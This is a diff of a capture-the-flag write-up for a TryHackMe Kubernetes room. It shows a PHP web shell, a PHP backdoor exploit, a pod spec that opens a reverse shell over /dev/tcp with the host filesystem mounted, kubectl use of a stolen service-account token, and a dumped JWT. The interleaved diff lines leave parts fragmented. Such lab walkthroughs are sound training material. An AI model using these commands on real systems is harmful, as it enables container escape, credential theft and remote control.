+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# echo '<?php $target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) { echo "File is an image - " . $check["mime"] . ".";  $uploadOk = 1;  } else {  echo "File is not an image.";  $uploadOk = 0;  }}?>' > hi.php
 ```
 
 ```bash
-echo '<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>'
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
+<p>
 
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat > /var/www/html/n.php << 'EOF'
-<p:/var/www/html# cat > /var/www/html/n.php << 'EOF'
+- navigated to :30679/hi.php</p>
+
+```bash
+:~/FrankandHerbyTryAgain# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+xx.xxx.xx.xx - - [05/Oct/2025 xx:xx:xx] "GET /kubectl HTTP/1.1." 200 -
+```
+
+```bash
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# chmod +x kubectl
+chmod +x kubectl
+```
+
+<p>
+
+- after attempts to evolve in this challenge, on many different days, I learned that I could trannsfer files in an simpler way<br><br><br>
+- I have never needed so much faith and grit to keep going ...</p>
+
+
+```bash
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# cat > /var/www/html/aa.php << 'EOF'
+<g:/var/www/html# cat > /var/www/html/aa.php << 'EOF'
 > <?php
 <?php
-> if(isset($_GET['cmd'])){
-if(isset($_GET['cmd'])){
->   system($_GET['cmd']);
-  system($_GET['cmd']);
-> }
-}
+> file_put_contents('backdoor.yaml', file_get_contents('http://xx.xxx.xx.xx:8000/backdoor.yaml'))
+<ontents('http://x.xxx.xx.xx:8000/backdoor.yaml'))
 > ?>
 ?>
 > EOF
 EOF
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
-
-
-
-
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
-ls
-index.php
-info.php
-n.php
-
-
-
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat n.php
-cat n.php
-<?php
-if(isset($_GET['cmd'])){
-  system($_GET['cmd']);
-}
-?>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# cat a.php << 'EOF'
-cat a.php << 'EOF'
-> <?php
-<?php
-> $target_dir = "uploads/";
-$target_dir = "uploads/";
-> $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
-$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
-> $uploadOk = 1;
-$uploadOk = 1;
-> $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
-$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
-> if(isset($_POST["submit"])) {
-if(isset($_POST["submit"])) {
->   $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
-  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
->   if($check !== false) {
-  if($check !== false) {
->     echo "File is an image - " . $check["mime"] . ".";
-    echo "File is an image - " . $check["mime"] . ".";
->     $uploadOk = 1;
-    $uploadOk = 1;
->   } else {
-  } else {
->     echo "File is not an image.";
-    echo "File is not an image.";
->     $uploadOk = 0;
-    $uploadOk = 0;
->   }
-  }
-> }
-}
-> ?>
-?>
-> EOF
-EOF
-cat: a.php: No such file or directory
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# 
-
-
-
-:~/FrankandHerbyTryAgain# curl -F "fileToUpload=@/root/FrankandHerbyTryAgain/kubectl" -F "submit=Upload" http://10.201.80.52:30679/y.php
-
-
-
-
-
-
-
-
-```bash
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# echo '<?php;$target_dir = "uploads/";$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));if(isset($_POST["submit"])) {  $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);  if($check !== false) {    echo "File is an image - " . $check["mime"] . ".";    $uploadOk = 1;  } else {    echo "File is not an image.";    $uploadOk = 0;  }}?>' >> rose.php
-<ot an image.";    $uploadOk = 0;  }}?>' >> rose.php
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
-ls
-index.php
-info.php
-rose.php
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html#
 ```
 
 ```bash
-:~/FrankandHerbyTryAgain# curl -v http://10.201.80.52:30679/rose.php
-*   Trying 10.201.80.52:30679...
-* TCP_NODELAY set
-* Connected to 10.201.80.52 (10.201.80.52) port 30679 (#0)
-> GET /rose.php HTTP/1.1
-> Host: 10.201.80.52:30679
-> User-Agent: curl/7.68.0
-> Accept: */*
-> 
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# exit
 ```
 
-```bash
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# ls
-ls
-index.php
-info.php
-rose.php
-```
+<p>
 
-```bash
-root@php-deploy-6d998f68b9-qvxwp:/var/www/html# exit
-```
-
-
-<img width="1230" height="190" alt="image" src="https://github.com/user-attachments/assets/3e64db4b-29af-490b-baa8-a19797878a49" />
-
-
+- navigated to :30679/aa.php</p>
 
 
 ```bash
-/tmp# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl.sha256"
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods -A                 
+./kubectl get pods -A
+NAMESPACE     NAME                                       READY   STATUS        RESTARTS      AGE
+kube-system   calico-node-gnp7n                          1/1     Running       1 (91d ago)   91d
+kube-system   calico-node-rpn2b                          1/1     Running       0             42m
+kube-system   coredns-64c6478b6c-kj7d2                   1/1     Terminating   5 (91d ago)   3y200d
+kube-system   calico-kube-controllers-664fd6f4fb-nj4q2   0/1     Terminating   1             91d
+frankland     php-deploy-6d998f68b9-wlslz                1/1     Terminating   4 (91d ago)   3y199d
+frankland     php-deploy-6d998f68b9-fvtcg                1/1     Running       0             37m
+kube-system   coredns-64c6478b6c-x6wss                   1/1     Running       0             37m
+kube-system   calico-kube-controllers-664fd6f4fb-5hlbd   1/1     Running       0             37m
 ```
 
 ```bash
-:/tmp# echo "$(cat kubectl.sha256)  kubectl" | sha256sum --check
-kubectl: OK
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get secrets -A
+./kubectl get secrets -A
+NAMESPACE         NAME                                             TYPE                                  DATA   AGE
+...
+frankland         default-token-5fdt4                              kubernetes.io/service-account-token   3      3y200d
+frankland         op-token-26qmx                                   kubernetes.io/service-account-token   3      3y200d
+...
+```
+
+<p>
+
+- path: /home/herby/app</p>
+
+```bash
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods frankland php-deploy-6d998f68b9-wlslz -o yaml
+< pods frankland php-deploy-6d998f68b9-wlslz -o yaml
+apiVersion: v1
+items:
+- apiVersion: v1
+  kind: Pod
+  metadata:
+...
+    generateName: php-deploy-6d998f68b9-
+    labels:
+      app: php-deploy
+      pod-template-hash: 6d998f68b9
+    name: php-deploy-6d998f68b9-wlslz
+    namespace: frankland
+...
+    - apiVersion: apps/v1
+      blockOwnerDeletion: true
+      controller: true
+      kind: ReplicaSet
+      name: php-deploy-6d998f68b9
+...
+  spec:
+    containers:
+    - image: vulhub/php:8.1-backdoor
+      imagePullPolicy: IfNotPresent
+      name: php-deploy
+...
+      volumeMounts:
+      - mountPath: /var/www/html
+        name: frank
+      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+...
+    - hostPath:
+        path: /home/herby/app
+        type: Directory
+      name: frank
+    - name: kube-api-access-tq4f4
+      projected:
+        defaultMode: 420
+        sources:
+        - serviceAccountToken:
+            expirationSeconds: 3607
+            path: token
+        - configMap:
+            items:
+            - key: ca.crt
+              path: ca.crt
+            name: kube-root-ca.crt
+        - downwardAPI:
+            items:
+            - fieldRef:
+                apiVersion: v1
+                fieldPath: metadata.namespace
+              path: namespace
+...
+      image: docker.io/vulhub/php:8.1-backdoor
+...
+```
+
+```bash
+root@php-deploy-6d998f68b9-fvtcg:/var/www/html# ./kubectl get pods -n frankland
+<vtcg:/var/www/html# ./kubectl get pods -n frankland
+NAME                          READY   STATUS        RESTARTS      AGE
+php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
+php-deploy-6d998f68b9-fvtcg   1/1     Running       0             65m
+```
+
+<p><em>rosana.yaml</em></p>
+
+```bash
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rosana
+  namespace: default
+spec:
+  containers:
+  - name: rosana
+    image: vulhub/php:8.1-backdoor
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/xx.xxx.xxx.xx/1337 0>&1"]
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+<br>
+<br>
+
+```bash
+:~/FrankandHerbyTryAgain# ~# ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token apply -f rosana.yaml
+pod/rosana created
 ```
 
 
-
-
-
-
-
-
-
-
-
-
-https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
-
-https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
-
-
-
-
-
-
-
-
-
-
-https://www.exploit-db.com/exploits/49933
-
-
-https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py
-
-
-
-
-
-root@ip-10-201-105-176:~# python3 revshell_php_8.1.0-dev.py http://10.201.46.77:30679/ 10.201.105.176 1337
-
-
-
-
-root@ip-10-201-105-176:~# nc -nlvp 1337
+```bash
+:~/FrankandHerbyTryAgain# nc -nlvp 1337
 Listening on 0.0.0.0 1337
-Connection received on 10.201.46.77 23354
+Connection received on xx.xxx.xx.xx 38002
 bash: cannot set terminal process group (1): Inappropriate ioctl for device
 bash: no job control in this shell
-root@php-deploy-6d998f68b9-4tg2g:/var/www/html# whoami
-whoami
-root
-root@php-deploy-6d998f68b9-4tg2g:/var/www/html# id
+root@ip-xx-xxx-xx-xx:/var/www/html# id
 id
 uid=0(root) gid=0(root) groups=0(root)
-root@php-deploy-6d998f68b9-4tg2g:/var/www/html# pwd             
-pwd
-/var/www/html
-root@php-deploy-6d998f68b9-4tg2g:/var/www/html# cd /run/secrets/kubernetes.io/serviceaccount
-</html# cd /run/secrets/kubernetes.io/serviceaccount
-root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 
-root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# cat namespace
-<secrets/kubernetes.io/serviceaccount# cat namespace                        
-root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# cat token
-<run/secrets/kubernetes.io/serviceaccount# cat token                        
-eyJhbGciOiJSUzI1NiIsImtpZCI6Img4TVpFMFp0RTlrc3NCdlpyT25fcEVZVzYyWm1CVWtlZTY2dC1OUjJhcmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTc5MTE1MTMzMCwiaWF0IjoxNzU5NjE1MzMwLCJpc3MiOiJodHRwczovL2t1YmVybmV0ZXMuZGVmYXVsdC5zdmMiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImZyYW5rbGFuZCIsInBvZCI6eyJuYW1lIjoicGhwLWRlcGxveS02ZDk5OGY2OGI5LTR0ZzJnIiwidWlkIjoiOGZjZmY4MmQtODEyZS00Yzk0LTk3NTMtNjJmN2VmNTQ4ZDYxIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiNmZhYmRmYzUtYzIwYS00ZDc1LWI2ZWItZTY4NTZlMDhhOTE3In0sIndhcm5hZnRlciI6MTc1OTYxODkzN30sIm5iZiI6MTc1OTYxNTMzMCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmZyYW5rbGFuZDpkZWZhdWx0In0.KIa9KwP-3cwJ6m-4qUnrOqQ3G-a1-klkUlCXzZ-fJIf2dE7oyTRlxLIXv_V1xvkzuXz355G-zwJQD5I0J25Dpnbu8nU_eVkZ2g2S-XUlK3goET7ThTfodufI-U5J1IW9YqLlT21yyxKy2AMyt3CRgd5dyDsy1598TxHOnIZJf7BpodDWm7mG5mVlGhMpxuYyY4H_pWlZjl1gvNrB6VLbJfBSe4XQaaF-LXbWGZ6KNk3oGhciQr_l2GOsbv2Lc9sbpk4xtP4liqWIlz6od9xqTQGXNyazUwEUpOv8-A7qdUKYTJMDccrcgGRoy_VSAgcrWOGydYj6qsj-7_T_DbLvbQroot@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 
-root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# env | grep KUBERNETES
-<kubernetes.io/serviceaccount# env | grep KUBERNETES                        
-KUBERNETES_SERVICE_PORT_HTTPS=443
-KUBERNETES_SERVICE_PORT=443
-KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
-KUBERNETES_PORT_443_TCP_PROTO=tcp
-KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
-KUBERNETES_SERVICE_HOST=10.152.183.1
-KUBERNETES_PORT=tcp://10.152.183.1:443
-KUBERNETES_PORT_443_TCP_PORT=443
-root@php-deploy-6d998f68b9-4tg2g:/run/secrets/kubernetes.io/serviceaccount# 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Navigated to 10.201.46.77:10255/pods
-
-
-/var/run/secrets/kubernetes.io/serviceaccount
-
-<img width="1136" height="103" alt="image" src="https://github.com/user-attachments/assets/7edd1cf0-1b61-4f5d-9fda-634c0c2b4367" />
-
-
-10.1.102.194/32
-
-podIP: 10.1.102.194
-
-/var/snap/microk8s/current/var/run/calico
-
-10.1.102.193
-10.1.102.95
-10.1.102.193/32
-10.1.102.195/32
-
-host-local-net-dir   :   /var/lib/cni/networks
-cni-bin-dir  :  /host/opt/cni/bin
-ube-api-access-nrplz : /var/run/secrets/kubernetes.io/serviceaccount
-
-
-name: FELIX_IPINIPMTU
-key: veth_mtu
-
-
-
-/var/snap/microk8s/current/var/run/calico
-/var/snap/microk8s/current/var/lib/calico
-xtables-lock
-/run/xtables.lock
-var/snap/microk8s/current/opt/cni/bin
-/var/snap/microk8s/current/args/cni-networks
-/var/snap/microk8s/current/var/lib/cni/networks
-/var/snap/microk8s/current/var/run/nodeagent
-/usr/libexec/kubernetes/kubelet-plugins/volume/exec/nodeagent~uds
-
-<img width="1225" height="420" alt="image" src="https://github.com/user-attachments/assets/0b543189-b54c-40e8-869a-bbe632032a90" />
-
-<img width="1133" height="527" alt="image" src="https://github.com/user-attachments/assets/9c3bcdd7-8879-4d46-b9ee-6f81f7c3b066" />
-
-
-
-
-
-
-```bash
-
 ```
 
+```bash
+root@ip-xx-xxx-xx-xx:/var/www/html# cd /mnt
+cd /mnt
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:/mnt# cd /home
+cd /home
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:/# cd /root
+cd /root
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:~# ls
+ls
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:~# cd ..
+cd ..
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:/# find / type -name user.txt 2>/dev/null
+find / type -name user.txt 2>/dev/null
+/mnt/home/herby/user.txt
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:/#  cat /mnt/home/herby/user.txt
+cat /mnt/home/herby/user.txt
+THM{*-******-****-*****}
+```
+
+<br>
+
+> 1.1. <em><strong>User</strong> flag?</em>
+>> <strong>THM{*-******-****-*****}</strong><br>
+<br>
+
+<br>
+<br>
+
+```bash
+:~/FrankandHerbyTryAgain#   ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get deployments -n frankland
+NAME         READY   UP-TO-DATE   AVAILABLE   AGE
+php-deploy   1/1     1            1           3y199d
+```
+
+```bash
+:~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get services -n frankland
+NAME         TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE
+php-deploy   NodePort   xx.xxx.xxx.xxx   <none>        80:30679/TCP   3y199d
+```
+
+```bash
+:~/FrankandHerbyTryAgain#  ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get pods -n frankland
+NAME                          READY   STATUS        RESTARTS      AGE
+php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (91d ago)   3y199d
+php-deploy-6d998f68b9-fvtcg   1/1     Running       0             132m
+```
+
+```bash
+:~/FrankandHerbyTryAgain# ./kubectl --server https://xx.xxx.xx.xx:16443 --certificate-authority=ca.crt --token=$token get nodes
+NAME              STATUS     ROLES    AGE      VERSION
+microk8s          NotReady   <none>   3y200d   v1.23.17-2+40cc20cc310518
+ip-xx-xxx-xx-xx   Ready      <none>   138m     v1.23.17-2+40cc20cc310518
+```
+
+<img width="1241" height="291" alt="image" src="https://github.com/user-attachments/assets/7218af65-dacd-48eb-8efb-fe23ba1db827" />
 
 
+<br>
+<br>
+<br>
+
+```bash
+root@ip-xx-xxx-xx-xx:/#  find / type -name root.txt 2>/dev/null
+find / type -name root.txt 2>/dev/null
+/mnt/root/root.txt
+```
+
+```bash
+root@ip-xx-xxx-xx-xx:/# cat /mnt/root/root.txt
+cat /mnt/root/root.txt
+THM{*****-***-*****-*****-****}
+```
+
+<br>
+
+> 1.2. <em><strong>Root</strong> flag?</em>
+>> <strongTHM{*****-***-*****-*****-****}</strong><br>
+
+<br>
+<br>
+
+
+<p>
+
+- I should have done this ... before</p>
+
+```bash
+:~/FrankandHerbyTryAgain# kubeletctl pods -s xx.xxx.xx.xx --http --port 10255
+```
+
+<img width="1182" height="399" alt="image" src="https://github.com/user-attachments/assets/8a36c602-9734-45ec-b4a0-abff22873504" />
+
+<br>
+<br>
+<br>
+
+<h1 align="center">Completed</h1>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9c47363a-58e9-445f-b589-17ffbb916718"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/081c3915-1938-4c43-a909-82a242f8e465"></p>
+
+<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>
+
+<div align="center"><h6>
+
+| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
+|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
+|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
+|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
+|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
+|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
+|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
+|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
+|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
+|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |
+
+</h6></div>
+<br>
+
+<p align="center">Global All Time:   106ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/98f604de-2a21-4d2d-811d-e547f0f8dca8"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/969a8da8-79f9-4d76-aab8-8a6cb7cb58f6"><br><br>
+                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/1f0c19ee-7f87-4fb8-8da5-c7b5c71d12c1"><br>
+                  Global monthly:     300ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d28a9ffe-4532-4c4d-b043-5e9cf63a9b28"><br>
+                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/a13ac859-b761-4e37-95b1-ad18cc718440"><br>
